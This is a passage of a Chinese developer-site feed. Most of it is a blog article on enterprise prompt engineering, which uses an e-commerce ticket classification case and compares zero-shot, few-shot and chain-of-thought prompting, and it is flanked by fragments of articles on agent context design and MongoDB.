<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a893af19e69b4e0586f2f35ea128f513~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO6Zuo5Lit55qE5bCP5LiD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771544706&amp;x-signature=IZA5oglljFU5TWc1iiO%2FYKbHLlk%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-4">五、 总结与突破：迈向 VM-Agent 架构</h2>
<p>简单总结下，Agent的上下文应该是基于状态机和代码运行时的上下文治理协议：</p>
<ul>
<li><strong>解耦“想”与“记”</strong>：窗口只留当前任务；Runtime存储活跃变量；文件系统存储长效经验。</li>
<li><strong>符号化操作</strong>：强制要求模型通过 search()、split()、filter() 来感知长上下文，严禁直接读取超长文本。</li>
<li><strong>递归函数化</strong>：将复杂的子任务封装成 Python 函数，内部调用 llm_query，实现真正的模块化推理。</li>
</ul>
<p>在追求无限长的context的同时，追求无限精简的有效状态</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[企业级 Prompt 工程实战指南（下）：构建可复用 Prompt 架构平台]]></title>    <link>https://juejin.cn/post/7605848213603139630</link>    <guid>https://juejin.cn/post/7605848213603139630</guid>    <pubDate>2026-02-13T00:47:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213603139630" data-draft-id="7605848213603123246" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="企业级 Prompt 工程实战指南（下）：构建可复用 Prompt 架构平台"/> <meta itemprop="keywords" content="前端,面试,架构"/> <meta itemprop="datePublished" content="2026-02-13T00:47:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="乘风gg"/> <meta itemprop="url" content="https://juejin.cn/user/4248168658899741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            企业级 Prompt 工程实战指南（下）：构建可复用 Prompt 架构平台
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4248168658899741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    乘风gg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T00:47:21.000Z" title="Fri Feb 13 2026 00:47:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前言：从“懂原理”到“能落地”</h2>
<p>在上篇内容中<a href="https://juejin.cn/post/7604678037808316452" target="_blank" title="https://juejin.cn/post/7604678037808316452">企业级 Prompt 工程实战指南（上）：别让模糊指令浪费你的AI算力</a>，我们拆解了 Prompt 的底层逻辑、四大核心要素，以及四大典型避坑技巧，解决了“<strong>怎么写才不踩坑</strong>”的基础问题。</p>
<p>但对一线开发者和架构师而言，Prompt 工程的最终价值，不在于“<strong>懂原理</strong>”，而在于“<strong>能落地</strong>”——如何将 Prompt 设计融入实际业务，降低开发成本、提升效率，构建可复用、可迭代的 Prompt 体系？</p>
<p>本篇将聚焦实战，通过完整业务案例拆解落地流程，对比不同技术路径的优劣，分享工程化落地技巧，并展望未来发展趋势，真正把 Prompt 技术转化为业务竞争力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/723d516bd7684a0fba0f7fa874087a7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LmY6aOOZ2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548440&amp;x-signature=AP0KP7nWOweI%2BY6MsgSFBps6h4M%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">二、实战案例：企业客服工单自动分类与摘要生成</h2>
<p>为了更直观地展示 Prompt 工程在实际业务中的应用效果，我们以一家电商企业的售后客服场景为例，详细拆解如何通过精心设计的 Prompt 实现工单的自动分类与摘要生成，大幅提升客服工作效率。</p>
<h3 data-id="heading-2">2.1 场景角色</h3>
<ul>
<li><strong>AI 应用产品经理（Prompt 设计者）</strong> ：负责设计和优化 Prompt，确保大语言模型能够准确理解业务需求并生成高质量的输出。</li>
<li><strong>客服团队（需求方）</strong> ：每天需要处理大量的售后工单，希望借助 AI 技术实现工单的自动分类和摘要生成，以减轻工作负担，提高服务效率。</li>
<li><strong>大模型（执行主体）</strong> ：选用市面上成熟的大语言模型，如 ChatGPT、Gemini、通义千问等，作为执行任务的核心引擎，根据输入的 Prompt 和工单文本进行分析和处理。</li>
<li><strong>服务对象</strong>：日均产生 500 + 售后工单的电商售后部门，涵盖各类复杂的客户问题和诉求。</li>
</ul>
<h3 data-id="heading-3">2.2 核心目标</h3>
<p>通过优化 Prompt 设计，让大语言模型<strong>自动将杂乱无章的售后工单</strong>准确分类为 “<strong>物流问题</strong>”“<strong>产品故障</strong>”“<strong>退换货申请</strong>” 三类，并为每个工单生成 50 字以内的结构化处理摘要，清晰概括核心诉求与关键信息。目标是替代人工分类，将整体工作效率提升 30% 以上，同时保证分类准确率达到 95% 以上，摘要关键信息覆盖率达到 90% 以上。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00f43762aa0949eeb99cbfb10c7fe942~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LmY6aOOZ2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548440&amp;x-signature=h%2Fdnj4KXmi78u78rVqroUKxpIP4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2.3 输入</h3>
<ul>
<li>
<p><strong>原始输入</strong>：无结构化的售后工单文本，例如 “我买的衣服尺码不对，昨天收到的，想换大一码，请问需要寄回吗？” 这类文本通常表述随意，包含大量冗余信息，需要模型进行信息提取和分类。</p>
</li>
<li>
<p><strong>辅助输入（少样本学习）</strong> ：为了引导模型更好地理解任务，提供 3 条分类示例，如：</p>
<ul>
<li><strong>示例 1</strong>：“我买的手机三天了还没收到，单号查不到，啥情况？” - 分类：<strong>物流问题</strong>；摘要：用户反映手机未收到且单号查询无果。</li>
<li><strong>示例 2</strong>：“刚用的吹风机，突然冒烟了，不敢再用了。” - 分类：<strong>产品故障</strong>；摘要：用户反馈吹风机使用中冒烟。</li>
<li><strong>示例 3</strong>：“买的电脑配置和宣传不符，申请退货。” - 分类：<strong>退换货申请</strong>；摘要：用户因电脑配置不符申请退货。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">2.4 处理流程（工具调用逻辑）</h3>
<ul>
<li><strong>第一步：编写系统 Prompt</strong>：“你是电商售后工单分类专家，需完成 2 个任务：1. 将工单分为物流问题 / 产品故障 / 退换货申请三类；2. 生成 50 字内处理摘要，包含核心诉求与关键信息。” 此系统 Prompt 明确了模型的角色和任务范围，为后续处理奠定基础。</li>
<li><strong>第二步：加入少样本示例</strong>：将上述 3 条分类示例加入 Prompt 中，让模型通过少样本学习掌握分类和摘要生成的模式与规则，增强模型对任务的理解和适应性。</li>
<li><strong>第三步：输入用户工单文本</strong>：将实际的售后工单文本输入给模型，与系统 Prompt 和少样本示例共同构成完整的输入信息，触发模型的处理流程。</li>
<li><strong>第四步：输出结构化结果</strong>：模型根据输入信息进行分析处理，输出结构化的结果，格式为 “分类：[具体类别]；摘要：[处理摘要]”。整个过程无需对模型进行微调，仅通过精心设计的 Prompt 即可实现高效的任务处理。</li>
</ul>
<h3 data-id="heading-6">2.5 输出与校验</h3>
<ul>
<li>
<p><strong>输出格式</strong>：“分类：退换货申请；摘要：用户购买衣服尺码不符，昨日收货，需求换货大一码，咨询寄回流程”。这种结构化的输出便于客服人员快速理解工单内容，提高处理效率。</p>
</li>
<li>
<p><strong>校验标准</strong>：</p>
<ul>
<li><strong>分类准确率</strong>：通过人工抽样复核 100 条工单，对比模型分类结果与人工标注结果，要求分类准确率达到 95% 以上。</li>
<li><strong>摘要关键信息覆盖率</strong>：同样抽样 100 条工单，检查摘要是否涵盖用户核心诉求和关键信息，如问题类型、涉及产品、关键时间等，覆盖率需达到 90% 以上。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-7">三、技术路径对比：不同 Prompt 策略的适用场景与成本分析</h2>
<h3 data-id="heading-8">3.1 三类主流 Prompt 技术路径对比表</h3>
<p>在实际应用中，零样本、少样本和思维链（CoT）这三类 Prompt 技术路径各有优劣，适用于不同的业务场景。下面通过表格对比，我们可以更清晰地了解它们在设计思路、优势、劣势、适用场景以及技术成本等方面的差异。</p>













































<table><thead><tr><th>技术路径</th><th>设计思路</th><th>优势</th><th>劣势</th><th>适用场景</th><th>技术成本</th><th>实现复杂度</th><th>落地可行性</th></tr></thead><tbody><tr><td>零样本 Prompt</td><td>仅输入任务描述，无示例</td><td>成本最低、无需准备样本、迭代快</td><td>准确率低、复杂任务易失控</td><td>简单文本生成、基础问答</td><td>极低（仅需指令设计）</td><td>低</td><td>极高（即写即用）</td></tr><tr><td>少样本 Prompt</td><td>加入 3-5 个示例引导模型</td><td>准确率高于零样本、适配多数场景</td><td>需准备标注示例、指令长度受限</td><td>文本分类、摘要生成、格式标准化</td><td>低（样本标注成本低）</td><td>中</td><td>高（中小规模业务首选）</td></tr><tr><td>思维链（CoT）Prompt</td><td>引导模型分步推理，展示思考过程</td><td>适配复杂逻辑任务、推理准确率高</td><td>指令设计复杂、token 消耗大、速度慢</td><td>数学计算、故障排查、多步骤决策</td><td>中（需设计推理框架）</td><td>高</td><td>中（适合专业场景）</td></tr></tbody></table>
<h3 data-id="heading-9">3.2 技术选型核心原则：成本与效果的平衡</h3>
<p>从高层往下看视角看，技术选型需遵循 “低成本优先” 原则：优先用零样本 Prompt 解决简单任务；中等复杂度任务采用少样本 Prompt，以最低标注成本提升准确率；仅复杂推理任务考虑思维链 Prompt，同时需评估 token 消耗带来的算力成本，避免过度设计。在实际应用中，我们要根据任务的复杂度、数据资源、算力成本等多方面因素，综合评估选择最合适的 Prompt 技术路径，以实现最佳的性价比。例如，在一个简单的文本分类任务中，如果使用思维链 Prompt，虽然可能会提高准确率，但由于其指令设计复杂、token 消耗大，会增加不必要的成本，此时选择少样本 Prompt 可能更为合适。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac04cbec5e864b18a85d8362befc16e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LmY6aOOZ2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548440&amp;x-signature=Ep1vPkbfpzquD%2FYwr5H8HpBarao%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">四、Prompt 工程化落地：从 “一次性指令” 到 “可复用架构”</h2>
<p>当我们在实际业务中大规模应用 Prompt 技术时，就不能仅仅满足于 “一次性” 的指令设计，而需要从工程化的角度构建一套可复用、可迭代、低成本的 Prompt 架构体系。这不仅关系到开发效率与成本控制，更是决定 AI 应用能否在复杂业务环境中持续稳定运行的关键。</p>
<h3 data-id="heading-11">4.1 模块化设计：Prompt 模板化与组件化</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7f4c9e4f9f240dfba35d061e3bba0fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LmY6aOOZ2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548440&amp;x-signature=CXorB7%2B41nLhhA%2BbQeU42A2uTuE%3D" alt="" loading="lazy"/> 从工程实践看，将 Prompt 拆分为多个可复用组件是提高开发效率与灵活性的关键。一个典型的 Prompt 可以拆解为 “<strong>角色定义 + 任务指令 + 格式约束 + 示例</strong>” 四大组件。以电商客服场景为例，我们可以将 “你是专业电商客服” 这一角色定义固化为通用组件；任务指令部分则根据不同工单类型（如物流咨询、产品售后等）动态替换；格式约束（如 “输出为 JSON 格式”）和示例（如常见问题及解答示例）也可按需调整。通过这种组件化设计，我们可以快速搭建针对不同业务场景的 Prompt，实现跨工单类型的快速适配，大幅降低重复开发成本。这种方式就像是搭积木，每个组件都是一个独立的模块 ，我们可以根据不同的业务需求，灵活地组合这些模块，快速构建出满足需求的 Prompt。<strong>在这之后还会专门搭建 Prompt 平台，专门存储和编写 Prompt，一键更新到 AI 应用里面，方便 Prompt 各种环境使用和进行版本管理</strong>。</p>
<h3 data-id="heading-12">4.2 迭代优化：基于输出反馈的指令调优</h3>
<p>Prompt 并非一成不变，而是需要根据模型输出结果持续优化。建立 “<strong>指令 - 输出 - 反馈 - 优化</strong>” 的闭环迭代流程是实现这一目标的核心。例如，在工单分类任务中，如果模型将某个 “产品故障” 工单误分类为 “物流问题”，我们需要深入分析指令设计的漏洞，比如是否存在未覆盖的边缘场景、示例是否足够典型等。</p>
<p><strong>针对这些问题</strong>，我们可以补充更多边缘场景的示例，细化分类规则，逐步提高模型的准确率。这种迭代优化的过程就像是对产品进行持续改进，通过不断收集用户反馈，优化产品功能，提升用户体验。</p>
<p>在这里，我想额外问一个问题 <strong>在进行 prompt 更新的时候，如何去评判 Prompt 前后两次修改的质量好坏呢？</strong> 我列出三个纬度供大家参考</p>
<ul>
<li>质量维度，能说到重点上吗？</li>
<li>稳定性纬度，每次问都回答一样吗？</li>
<li>正确性纬度，回答的数据正确吗？</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba9834b88ecd4e8ba2280f62332b54ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LmY6aOOZ2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548440&amp;x-signature=vjYgv9GwymV5pDYKRGqlTS60muc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">4.3 成本控制：减少无效 token 消耗</h3>
<p>在实际应用中，token 消耗不单单会影响大模型幻觉，还会直接关系到算力成本，因此从工程化角度优化 token 使用至关重要。首先，要<strong>精简指令内容，避免冗长复杂的表述</strong>，确保每一个 token 都传递有效信息；</p>
<p>其次，合理利用模型上下文窗口特性，优先保留系统 Prompt 中的核心规则与约束，对用户输入中的冗余信息进行预处理；对于超长文本任务，结合<strong>检索增强生成（RAG）技术</strong>，将长文本拆分为多个短文本分批次输入，避免一次性输入导致的 token 溢出。这就好比在装修房子时，合理规划空间，避免浪费，让每一寸空间都得到充分利用。通过这些策略，可以在保证模型性能的前提下，有效降低 token 成本，提高应用的性价比。</p>
<h2 data-id="heading-14">五、总结与展望：Prompt 工程的现在与趋势</h2>
<h3 data-id="heading-15">5.1 核心观点总结</h3>
<p>Prompt 工程的本质是 “<strong>用工程化思维替代感性经验</strong>”，核心在于<strong>明确角色、拆解任务、约束格式、补充示例</strong>，而非依赖模型参数提升。对于多数企业级应用，优质 Prompt 设计带来的效果提升，远高于盲目追求大模型升级的收益。在实际应用中，我们不应过分关注模型的参数规模和性能指标，而应将更多的精力放在如何设计有效的 Prompt 上。通过合理的 Prompt 设计，我们可以引导模型更好地理解任务需求，提高输出的质量和准确性，从而实现更高的性价比。</p>
<h3 data-id="heading-16">5.2 当前局限性</h3>
<p>现有 Prompt 技术仍存在边界：<strong>无法突破模型预训练知识范围</strong>，易产生 <strong>“幻觉”</strong> ；复杂任务的指令设计依赖专业经验；<strong>多模态场景</strong>下的 Prompt 设计尚未形成标准化方案。例如，当我们询问模型关于未来的科技发展趋势时，由于模型的知识截止于训练时间，它无法提供最新的信息，可能会产生不准确或过时的回答。在多模态场景下，如结合图像和文本的应用中，如何设计有效的 Prompt 以实现多模态信息的融合和交互，仍然是一个待解决的问题。</p>
<h3 data-id="heading-17">5.3 目前趋势展望</h3>
<p>目前 Prompt 工程将向 “自动化” 与 “融合化” 发展：自动化方面，AI 将自主生成并优化 Prompt，降低人工设计门槛；融合化方面，Prompt 将与 RAG 深度结合，形成 “<strong>Prompt+RAG</strong> 解决知识时效性的 SOP。随着技术的不断发展，我们可以期待 AI 能够根据用户的需求自动生成和优化 Prompt，进一步提高效率和准确性。Prompt 与其他技术的融合也将为 AI 应用带来更多的可能性，推动 AI 技术在各个领域的深入应用和发展。</p>
<p>感谢观看，欢迎大家点赞关注，下期更精彩！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MongoDB（11）MongoDB的默认端口号是多少？]]></title>    <link>https://juejin.cn/post/7605539194690404352</link>    <guid>https://juejin.cn/post/7605539194690404352</guid>    <pubDate>2026-02-12T23:04:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605539194690404352" data-draft-id="7605772919224123426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MongoDB（11）MongoDB的默认端口号是多少？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-12T23:04:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MongoDB（11）MongoDB的默认端口号是多少？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T23:04:04.000Z" title="Thu Feb 12 2026 23:04:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MongoDB的默认端口号是 